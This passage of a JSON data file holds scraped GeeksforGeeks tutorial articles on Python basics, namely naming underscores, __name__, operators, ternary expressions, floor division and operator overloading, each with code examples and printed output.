value):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in zip(keys, value):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.list.append(i)The mangling rules are designed mostly to avoid accidents but it is still possible to access or modify a variable that is considered private. This can even be useful in special circumstances, such as in the debugger.\u00a0_Single Leading UnderscoresSo basically one underline at the beginning of a method, function, or data member means you shouldn\u2019t access this method because it\u2019s not part of the API. Let\u2019s look at this snippet of code:\u00a0Python# Python code to illustrate# how single underscore worksdef _get_errors(self):\u00a0\u00a0\u00a0\u00a0if self._errors is None:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.full_clean()\u00a0\u00a0\u00a0\u00a0return self._errors\u00a0errors = property(_get_errors)The snippet is taken from the Django source code (django/forms/forms.py). This suggests that errors are property, and it\u2019s also a part of the API, but the method, _get_errors, is \u201cprivate\u201d, so one shouldn\u2019t access it.\u00a0__Double Leading UnderscoresTwo underlines, in the beginning, cause a lot of confusion. This is about syntax rather than a convention. double underscore will mangle the attribute names of a class to avoid conflicts of attribute names between classes. For example:\u00a0Python# Python code to illustrate how double# underscore at the beginning worksclass Geek:\u00a0\u00a0\u00a0\u00a0def _single_method(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0\u00a0\u00a0def __double_method(self): # for mangling\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0passclass Pyth(Geek):\u00a0\u00a0\u00a0\u00a0def __double_method(self): # for mangling\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass__Double leading and Double trailing underscores__There\u2019s another case of double leading and trailing underscores. We follow this while using special variables or methods (called \u201cmagic method\u201d) such as__len__, __init__. These methods provide special syntactic features to the names. For example, __file__ indicates the location of the Python file, __eq__ is executed when a == b expression is executed.\u00a0\u00a0Example:\u00a0\u00a0Python# Python code to illustrate double leading and# double trailing underscore worksclass Geek:\u00a0\u00a0\u00a0\u00a0\u00a0# '__init__' for initializing, this is a\u00a0\u00a0\u00a0\u00a0# special method\u00a0\u00a0\u00a0\u00a0\u00a0def __init__(self, ab):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.ab = ab\u00a0\u00a0\u00a0\u00a0\u00a0# custom special method. try not to use it\u00a0\u00a0\u00a0\u00a0def __custom__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0passThis article is contributed by Chinmoy Lenka. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.\u00a0I have referred Python Docs, hackernoon.com and igorsobreira.comPlease write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3e084bd6a4b265bcd71434c055b08149",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Since there is no main() function in Python, when the command to run a python program is given to the interpreter, the code that is at level 0 indentation is to be executed. However, before doing that, it will define a few special variables. __name__ is one such special variable. If the source file is executed as the main program, the interpreter sets the __name__ variable to have a value \u201c__main__\u201d. If this file is being imported from another module, __name__ will be set to the module\u2019s name.__name__ is a built-in variable which evaluates to the name of the current module. Thus it can be used to check whether the current script is being run on its own or being imported somewhere else by combining it with if statement, as shown below.Consider two separate files File1 and File2.# File1.py\u00a0\u00a0\u00a0print (\"File1 __name__ = %s\" %__name__)\u00a0\u00a0\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0\u00a0print (\"File1 is being run directly\")else:\u00a0\u00a0\u00a0\u00a0\u00a0print (\"File1 is being imported\")\u00a0# File2.py\u00a0\u00a0\u00a0import File1\u00a0\u00a0\u00a0print (\"File2 __name__ = %s\" %__name__)\u00a0\u00a0\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0\u00a0print (\"File2 is being run directly\")else:\u00a0\u00a0\u00a0\u00a0\u00a0print (\"File2 is being imported\")\r\nNow the interpreter is given the command to run File1.py.\r\npython File1.py\r\nOutput :\r\nFile1 __name__ = __main__\r\nFile1 is being run directly\r\n\r\n\r\nAnd then File2.py is run.\r\npython File2.py\r\nOutput :\r\nFile1 __name__ = File1\r\nFile1 is being imported\r\nFile2 __name__ = __main__\r\nFile2 is being run directly\r\nAs seen above, when File1.py is run directly, the interpreter sets the __name__ variable as __main__ and when it is run through File2.py by importing, the __name__ variable is set as the name of the python script, i.e. File1. Thus, it can be said that if __name__ == \u201c__main__\u201d is the part of the program that runs when the script is run from the command line using a command like python File1.py.This article is contributed by Harshit Agrawal. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "13b1fd5c360a8a2451139ec8776ca873",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python Operators in general are used to perform operations on values and variables. These are standard symbols used for the purpose of logical and arithmetic operations. In this article, we will look into different types of Python operators.\u00a0Arithmetic OperatorsArithmetic operators are used to performing mathematical operations like addition, subtraction, multiplication, and division.OperatorDescriptionSyntax+Addition: adds two operandsx + y\u2013Subtraction: subtracts two operandsx \u2013 y*Multiplication: multiplies two operandsx * y/Division (float): divides the first operand by the secondx / y//Division (floor): divides the first operand by the secondx // y%Modulus: returns the remainder when the first operand is divided by the secondx % y**Power: Returns first raised to power secondx ** yExample: Arithmetic operators in PythonPython3# Examples of Arithmetic Operatora = 9b = 4\u00a0# Addition of numbersadd = a + b\u00a0# Subtraction of numberssub = a - b\u00a0# Multiplication of numbermul = a * b\u00a0# Division(float) of numberdiv1 = a / b\u00a0# Division(floor) of numberdiv2 = a // b\u00a0# Modulo of both numbermod = a % b\u00a0# Powerp = a ** b\u00a0# print resultsprint(add)print(sub)print(mul)print(div1)print(div2)print(mod)print(p)Output13\n5\n36\n2.25\n2\n1\n6561Note: Refer to Differences between / and // for some interesting facts about these two operators.Comparison OperatorsComparison of Relational operators compares the values. It either returns True or False according to the condition.OperatorDescriptionSyntax>Greater than: True if the left operand is greater than the rightx > y<Less than: True if the left operand is less than the rightx < y==Equal to: True if both operands are equalx == y!=Not equal to \u2013 True if operands are not equalx != y>=Greater than or equal to True if the left operand is greater than or equal to the rightx >= y<=Less than or equal to True if the left operand is less than or equal to the rightx <= yExample: Comparison Operators in PythonPython3# Examples of Relational Operatorsa = 13b = 33\u00a0# a > b is Falseprint(a > b)\u00a0# a < b is Trueprint(a < b)\u00a0# a == b is Falseprint(a == b)\u00a0# a != b is Trueprint(a != b)\u00a0# a >= b is Falseprint(a >= b)\u00a0# a <= b is Trueprint(a <= b)OutputFalse\nTrue\nFalse\nTrue\nFalse\nTrueLogical OperatorsLogical operators perform Logical AND, Logical OR, and Logical NOT operations. It is used to combine conditional statements.OperatorDescriptionSyntaxandLogical AND: True if both the operands are truex and yorLogical OR: True if either of the operands is true\u00a0x or ynotLogical NOT: True if the operand is false\u00a0not xExample: Logical Operators in PythonPython3# Examples of Logical Operatora = Trueb = False\u00a0# Print a and b is Falseprint(a and b)\u00a0# Print a or b is Trueprint(a or b)\u00a0# Print not a is Falseprint(not a)OutputFalse\nTrue\nFalseBitwise OperatorsBitwise operators act on bits and perform the bit-by-bit operations. These are used to operate on binary numbers.OperatorDescriptionSyntax&Bitwise ANDx & y|Bitwise ORx | y~Bitwise NOT~x^Bitwise XORx ^ y>>Bitwise right shiftx>><<Bitwise left shiftx<<Example: Bitwise Operators in PythonPython3# Examples of Bitwise operatorsa = 10b = 4\u00a0# Print bitwise AND operationprint(a & b)\u00a0# Print bitwise OR operationprint(a | b)\u00a0# Print bitwise NOT operationprint(~a)\u00a0# print bitwise XOR operationprint(a ^ b)\u00a0# print bitwise right shift operationprint(a >> 2)\u00a0# print bitwise left shift operationprint(a << 2)Output0\n14\n-11\n14\n2\n40Assignment Operators\u00a0Assignment operators are used to assigning values to the variables.OperatorDescriptionSyntax=Assign value of right side of expression to left side operand\u00a0x = y + z+=Add AND: Add right-side operand with left side operand and then assign to left operanda+=b \u00a0 \u00a0 a=a+b-=Subtract AND: Subtract right operand from left operand and then assign to left operanda-=b \u00a0 \u00a0 a=a-b*=Multiply AND: Multiply right operand with left operand and then assign to left operanda*=b \u00a0 \u00a0 a=a*b/=Divide AND: Divide left operand with right operand and then assign to left operanda/=b \u00a0 \u00a0 a=a/b%=Modulus AND: Takes modulus using left and right operands and assign the result to left operanda%=b \u00a0 \u00a0 a=a%b//=Divide(floor) AND: Divide left operand with right operand and then assign the value(floor) to left operanda//=b \u00a0 \u00a0 a=a//b**=Exponent AND: Calculate exponent(raise power) value using operands and assign value to left operanda**=b \u00a0 \u00a0 a=a**b&=Performs Bitwise AND on operands and assign value to left operanda&=b \u00a0 \u00a0 a=a&b|=Performs Bitwise OR on operands and assign value to left operanda|=b \u00a0 \u00a0 a=a|b^=Performs Bitwise xOR on operands and assign value to left operanda^=b \u00a0 \u00a0 a=a^b>>=Performs Bitwise right shift on operands and assign value to left operanda>>=b \u00a0 \u00a0 a=a>>b<<=Performs Bitwise left shift on operands and assign value to left operanda <<= b \u00a0 \u00a0 a= a << bExample: Assignment Operators in PythonPython3# Examples of Assignment Operatorsa = 10\u00a0# Assign valueb = aprint(b)\u00a0# Add and assign valueb += aprint(b)\u00a0# Subtract and assign valueb -= aprint(b)\u00a0# multiply and assignb *= aprint(b)\u00a0# bitwise lishift operatorb <<= aprint(b)Output10\n20\n10\n100\n102400Identity Operatorsis and is not are the identity operators both are used to check if two values are located on the same part of the memory. Two variables that are equal do not imply that they are identical.\u00a0is          True if the operands are identical \nis not      True if the operands are not identical Example: Identity OperatorPython3a = 10b = 20c = a\u00a0print(a is not b)print(a is c)OutputTrue\nTrueMembership Operatorsin and not in are the membership operators; used to test whether a value or variable is in a sequence.in            True if value is found in the sequence\nnot in        True if value is not found in the sequenceExample: Membership OperatorPython3# Python program to illustrate# not 'in' operatorx = 24y = 20list = [10, 20, 30, 40, 50]\u00a0if (x not in list):\u00a0\u00a0\u00a0\u00a0print(\"x is NOT present in given list\")else:\u00a0\u00a0\u00a0\u00a0print(\"x is present in given list\")\u00a0if (y in list):\u00a0\u00a0\u00a0\u00a0print(\"y is present in given list\")else:\u00a0\u00a0\u00a0\u00a0print(\"y is NOT present in given list\")Outputx is NOT present in given list\ny is present in given listPrecedence and Associativity of OperatorsPrecedence and Associativity of Operators: Operator precedence and associativity determine the priorities of the operator.Operator PrecedenceThis is used in an expression with more than one operator with different precedence to determine which operation to perform first.Example: Operator PrecedencePython3# Examples of Operator Precedence\u00a0# Precedence of '+' & '*'expr = 10 + 20 * 30print(expr)\u00a0# Precedence of 'or' & 'and'name = \"Alex\"age = 0\u00a0if name == \"Alex\" or name == \"John\" and age >= 2:\u00a0\u00a0\u00a0\u00a0print(\"Hello! Welcome.\")else:\u00a0\u00a0\u00a0\u00a0print(\"Good Bye!!\")Output610\nHello! Welcome.Operator AssociativityIf an expression contains two or more operators with the same precedence then Operator Associativity is used to determine. It can either be Left to Right or from Right to Left.Example: Operator AssociativityPython3# Examples of Operator Associativity\u00a0# Left-right associativity# 100 / 10 * 10 is calculated as# (100 / 10) * 10 and not# as 100 / (10 * 10)print(100 / 10 * 10)\u00a0# Left-right associativity# 5 - 2 + 3 is calculated as# (5 - 2) + 3 and not# as 5 - (2 + 3)print(5 - 2 + 3)\u00a0# left-right associativityprint(5 - (2 + 3))\u00a0# right-left associativity# 2 ** 3 ** 2 is calculated as# 2 ** (3 ** 2) and not# as (2 ** 3) ** 2print(2 ** 3 ** 2)Output100.0\n6\n0\n512Quiz on Python OperatorsMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "0369e76788101f5ca3f884ca71e0d029",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Most of the languages including C, C++, Java and Python provide the boolean type that can be either set to False or True.Consider below programs that use Logical Not (or !) operator on boolean.\u00a0\u00a0C/C++\n// A C/C++ program that uses Logical Not or ! on boolean\n#include <stdio.h>\n#include <stdbool.h>\n\nint main()\n{\n    bool a = 1, b = 0;\n    a = !a;\n    b = !b;\n    printf(\"%d\\n%d\", a, b);\n    return 0;\n}\n// Output: 0\n//         1\nJava// A Java program that uses Logical Not or ! on booleanimport java.io.*;\u00a0class GFG{\u00a0\u00a0\u00a0\u00a0public static void main (String[] args)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0boolean a = true, b = false;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(!a);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(!b);\u00a0\u00a0\u00a0\u00a0}}// Output: False//\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 TruePython# A Python program that uses Logical Not or ! on booleana = not Trueb = not Falseprint aprint b# Output: False#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 TrueC#// C# program that uses Logical// Not or ! on booleanusing System;\u00a0class GFG{\u00a0\u00a0\u00a0\u00a0public static void Main ()\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bool a = true, b = false;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Console.WriteLine(!a);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Console.WriteLine(!b);\u00a0\u00a0\u00a0\u00a0}}// Output: False//\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 True\u00a0// This code is contributed// by Rajput-JiJavascript<script>// A javascript program that uses Logical Not or ! on boolean\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0var a = true, b = false;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0document.write(!a+\"<br/>\");\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0document.write(!b);\u00a0// Output: False// True\u00a0// This code contributed by gauravrajput1</script>The outputs of above programs are as expected, but the outputs following programs may not be as expected if we have not used Bitwise Not (or ~) operator before.\u00a0Python# A Python program that uses Bitwise Not or ~ on booleana = Trueb = Falseprint ~aprint ~bC/C++\n// C/C++ program that uses Bitwise Not or ~ on boolean\n#include <bits/stdc++.h>\nusing namespace std;\nint main()\n{\n    bool a = true, b = false;\n    cout << ~a << endl << ~b;\n    return 0;\n}\nJava// A Java program that uses Bitwise Not or ~ on booleanimport java.io.*;\u00a0class GFG{\u00a0\u00a0\u00a0\u00a0public static void main (String[] args)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0boolean a = true, b = false;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(~a);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(~b);\u00a0\u00a0\u00a0\u00a0}}Output:\u00a0\u00a06: error: bad operand type boolean for unary operator '~'\n        System.out.println(~a);\n                           ^\n7: error: bad operand type boolean for unary operator '~'\n        System.out.println(~b);\n                           ^\n2 errorsConclusion:\u00a0\u201cLogical not or !\u201d is meant for boolean values and \u201cbitwise not or ~\u201d is for integers. Languages like C/C++ and python do auto promotion of boolean to integer type when an integer operator is applied. But Java doesn\u2019t do it.This article is contributed by Arpit Agarwal. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "0b31a2ed2a60764770e9042959efc674",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Ternary operators are also known as conditional expressions are operators that evaluate something based on a condition being true or false. It was added to Python in version 2.5.\u00a0It simply allows testing a condition in a single line replacing the multiline if-else making the code compact.\u00a0Syntax :\u00a0[on_true] if [expression] else [on_false] Simple Method to use ternary operator:Python# Program to demonstrate conditional operatora, b = 10, 20\u00a0# Copy value of a in min if a < b else copy bmin = a if a < b else b\u00a0print(min)Output:\u00a010Direct Method by using tuples, Dictionary, and lambdaPython# Python program to demonstrate ternary operatora, b = 10, 20\u00a0# Use tuple for selecting an item# (if_test_false,if_test_true)[test]# if [a<b] is true it return 1, so element with 1 index will print# else if [a<b] is false it return 0, so element with 0 index will printprint( (b, a) [a < b] )\u00a0# Use Dictionary for selecting an item# if [a < b] is true then value of True key will print# elif [a<b] is false then value of False key will printprint({True: a, False: b} [a < b])\u00a0# lambda is more efficient than above two methods# because in lambda\u00a0 we are assure that# only one expression will be evaluated unlike in# tuple and Dictionaryprint((lambda: b, lambda: a)[a < b]())Output:10\n10\n10Ternary operator can be written as nested if-else:Python# Python program to demonstrate nested ternary operatora, b = 10, 20\u00a0print (\"Both a and b are equal\" if a == b else \"a is greater than b\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if a > b else \"b is greater than a\")The above approach can be written as:\u00a0\u00a0Python# Python program to demonstrate nested ternary operatora, b = 10, 20\u00a0if a != b:\u00a0\u00a0\u00a0\u00a0if a > b:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"a is greater than b\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"b is greater than a\")else:\u00a0\u00a0\u00a0\u00a0print(\"Both a and b are equal\")Output: b is greater than aTo use print function in ternary operator be like:-\u00a0Example: Find the Larger number among 2 using ternary operator in python3Python3a=5b=7\u00a0# [statement_on_True] if [condition] else [statement_on_false]\u00a0print(a,\"is greater\") if (a>b) else print(b,\"is Greater\")Output:7 is GreaterImportant Points:\u00a0First the given condition is evaluated (a < b), then either a or b is returned based on the Boolean value returned by the conditionOrder of the arguments in the operator is different from other languages like C/C++ (See C/C++ ternary operators).Conditional expressions have the lowest priority amongst all Python operations.Method used prior to 2.5 when the ternary operator was not present\u00a0In an expression like the one given below, the interpreter checks for the expression if this is true then on_true is evaluated, else the on_false is evaluated.\u00a0Syntax :\u00a0'''When condition becomes true, expression [on_false]\n   is not executed and value of \"True and [on_true]\"\n   is returned.  Else value of \"False or [on_false]\"\n   is returned.\n   Note that \"True and x\" is equal to x. \n   And \"False or x\" is equal to x. '''\n[expression] and [on_true] or [on_false] Example :\u00a0Python# Program to demonstrate conditional operatora, b = 10, 20\u00a0# If a is less than b, then a is assigned# else b is assigned (Note : it doesn't# work if a is 0.min = a < b and a or b\u00a0print(min)Output:10Note : The only drawback of this method is that on_true must not be zero or False. If this happens on_false will be evaluated always. The reason for that is if the expression is true, the interpreter will check for the on_true, if that will be zero or false, that will force the interpreter to check for on_false to give the final result of the whole expression.This article is contributed by Mayank Rawat and improved by Shubham Bansal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3dcf7e0728b2f1946156cd0bf5a17988",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Consider the below statements in Python.\u00a0Python3# A Python program to demonstrate the use of# \"//\" for integersprint (5//2)print (-5//2)Output:2\n-3The first output is fine, but the second one may be surprised if we are coming Java/C++ world. In Python, the \u201c//\u201d operator works as a floor division for integer and float arguments. However, the operator / returns a float value if one of the arguments is a float (this is similar to C++)Note:The \u201c//\u201d operator is used to return the closest integer value which is less than or equal to a specified expression or value. So from the above code, 5//2 returns 2. You know that 5/2 is 2.5, the closest integer which is less than or equal is 2[5//2].( it is inverse to the normal maths, in normal maths the value is 3).\u00a0Python3# A Python program to demonstrate use of# \"/\" for floating point numbersprint (5.0/2)print (-5.0/2)Output:2.5\n-2.5The real floor division operator is \u201c//\u201d. It returns floor value for both integer and floating point arguments.\u00a0Python3# A Python program to demonstrate use of# \"//\" for both integers and floating pointsprint (5//2)print (-5//2)print (5.0//2)print (-5.0//2)Output:2\n-3\n2.0\n-3.0See this for example.\u00a0This article is contributed by Arpit Agrawal. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1a9e1058a02cdbbb96b2a67db75d7872",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Operator Overloading means giving extended meaning beyond their predefined operational meaning. For example operator + is used to add two integers as well as join two strings and merge two lists. It is achievable because \u2018+\u2019 operator is overloaded by int class and str class. You might have noticed that the same built-in operator or function shows different behavior for objects of different classes, this is called Operator Overloading.\u00a0\u00a0Python3# Python program to show use of# + operator for different purposes.\u00a0print(1 + 2)\u00a0# concatenate two stringsprint(\"Geeks\"+\"For\")\u00a0# Product two numbersprint(3 * 4)\u00a0# Repeat the Stringprint(\"Geeks\"*4)Output:\u00a0\u00a03\nGeeksFor\n12\nGeeksGeeksGeeksGeeksHow to overload the operators in Python?\u00a0Consider that we have two objects which are a physical representation of a class (user-defined data type) and we have to add two objects with binary \u2018+\u2019 operator it throws an error, because compiler don\u2019t know how to add two objects. So we define a method for an operator and that process is called operator overloading. We can overload all existing operators but we can\u2019t create a new operator. To perform operator overloading, Python provides some special function or magic function that is automatically invoked when it is associated with that particular operator. For example, when we use + operator, the magic method __add__ is automatically invoked in which the operation for + operator is defined.Overloading binary + operator in Python :\u00a0When we use an operator on user defined data types then automatically a special function or magic function associated with that operator is invoked. Changing the behavior of operator is as simple as changing the behavior of method or function. You define methods in your class and operators work according to that behavior defined in methods. When we use + operator, the magic method __add__ is automatically invoked in which the operation for + operator is defined. There by changing this magic method\u2019s code, we can give extra meaning to the + operator.\u00a0Code 1:\u00a0\u00a0Python3# Python Program illustrate how# to overload an binary + operator\u00a0class A:\u00a0\u00a0\u00a0\u00a0def __init__(self, a):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = a\u00a0\u00a0\u00a0\u00a0\u00a0# adding two objects\u00a0\u00a0\u00a0\u00a0def __add__(self, o):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.a + o.aob1 = A(1)ob2 = A(2)ob3 = A(\"Geeks\")ob4 = A(\"For\")\u00a0print(ob1 + ob2)print(ob3 + ob4)Output :\u00a0\u00a03\nGeeksForCode 2:\u00a0\u00a0Python3# Python Program to perform addition# of two complex numbers using binary# + operator overloading.\u00a0class complex:\u00a0\u00a0\u00a0\u00a0def __init__(self, a, b):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.b = b\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# adding two objects\u00a0\u00a0\u00a0\u00a0def __add__(self, other):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.a + other.a, self.b + other.b\u00a0Ob1 = complex(1, 2)Ob2 = complex(2, 3)Ob3 = Ob1 + Ob2print(Ob3)Output :\u00a0\u00a0(3, 5)Overloading comparison operators in Python :\u00a0\u00a0Python3# Python program to overload# a comparison operators\u00a0class A:\u00a0\u00a0\u00a0\u00a0def __init__(self, a):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = a\u00a0\u00a0\u00a0\u00a0def __gt__(self, other):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if(self.a>other.a):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return Falseob1 = A(2)ob2 = A(3)if(ob1>ob2):\u00a0\u00a0\u00a0\u00a0print(\"ob1 is greater than ob2\")else:\u00a0\u00a0\u00a0\u00a0print(\"ob2 is greater than ob1\")Output :\u00a0\u00a0ob2 is greater than ob1Overloading equality and less than operators :\u00a0\u00a0Python3# Python program to overload equality# and less than operators\u00a0class A:\u00a0\u00a0\u00a0\u00a0def __init__(self, a):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.a = a\u00a0\u00a0\u00a0\u00a0def __lt__(self, other):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if(self.a<other.a):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"ob1 is lessthan ob2\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"ob2 is less than ob1\"\u00a0\u00a0\u00a0\u00a0def __eq__(self, other):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if(self.a == other.a):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"Both are equal\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return \"Not equal\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ob1 = A(2)ob2 = A(3)print(ob1 < ob2)\u00a0ob3 = A(4)ob4 = A(4)print(ob1 == ob2)Output :\u00a0\u00a0ob1 is lessthan ob2\nNot equalPython magic methods or special functions for operator overloadingBinary Operators:OperatorMagic Method+__add__(self, other)\u2013__sub__(self, other)*__mul__(self, other)/__truediv__(self, other)//__floordiv__(self, other)%__mod__(self, other)**__pow__(self, other)>>__rshift__(self, other)<<__lshift__(self, other)&__and__(self, other)|__or__(self, other)^__xor__(self, other)Comparison Operators :OperatorMagic Method<__LT__(SELF, OTHER)>__GT__(SELF, OTHER)<=__LE__(SELF, OTHER)>=__GE__(SELF, OTHER)==__EQ__(SELF, OTHER)!=__NE__(SELF, OTHER)Assignment Operators :OperatorMagic Method-=__ISUB__(SELF, OTHER)+=__IADD__(SELF, OTHER)*=__IMUL__(SELF, OTHER)/=__IDIV__(SELF, OTHER)//=__IFLOORDIV__(SELF, OTHER)%=__IMOD__(SELF, OTHER)**=__IPOW__(SELF, OTHER)>>=__IRSHIFT__(SELF, OTHER)<<=__ILSHIFT__(SELF, OTHER)&=__IAND__(SELF, OTHER)|=__IOR__(SELF, OTHER)^=__IXOR__(SELF, OTHER)Unary Operators :OperatorMagic Method\u2013__NEG__(SELF, OTHER)+__POS__(SELF, OTHER)~__INVERT__(SELF, OTHER)My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ac5776802d716e6535674e8e8a40ccca",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
